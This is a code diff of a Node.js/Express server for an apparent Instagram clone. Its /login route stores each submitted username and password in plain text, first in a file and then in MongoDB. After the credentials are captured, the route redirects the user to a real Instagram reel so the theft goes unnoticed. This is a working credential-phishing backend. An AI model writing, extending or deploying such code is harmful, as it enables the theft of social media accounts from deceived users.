@@ -1,30 +1,56 @@
 const express = require("express");
-const fs = require("fs");
 const bodyParser = require("body-parser");
 const path = require("path");
+const mongoose = require("mongoose");
 
 const app = express();
 
+// Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
+// MongoDB Connection
+mongoose.connect("mongodb://127.0.0.1:27017/instagramCloneDB")
+  .then(() => console.log("MongoDB Connected"))
+  .catch((err) => console.log(err));
+
+// Schema
+const userSchema = new mongoose.Schema({
+  username: String,
+  password: String,
+});
+
+const User = mongoose.model("User", userSchema);
+
+// Home Route
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-app.post("/login", (req, res) => {
-  const { username, password } = req.body;
+// Login Route
+app.post("/login", async (req, res) => {
+  try {
+    const { username, password } = req.body;
 
-  const data = `Username: ${username}, Password: ${password}\n`;
+    // Save directly in MongoDB
+    const newUser = new User({
+      username,
+      password,
+    });
 
-  fs.appendFile("data.txt", data, (err) => {
-    if (err) throw err;
-    console.log("Saved!");
-  });
+    await newUser.save();
 
-  res.send("error!");
+    console.log("User saved!");
+
+    res.redirect("https://www.instagram.com/reel/DXH9OJcjdb5/?utm_source=ig_web_copy_link");
+
+  } catch (error) {
+    console.log(error);
+    res.status(500).send("Error fetching");
+  }
 });
 
+// Start Server
 app.listen(3000, () => {
   console.log("Server running on http://localhost:3000");
 });
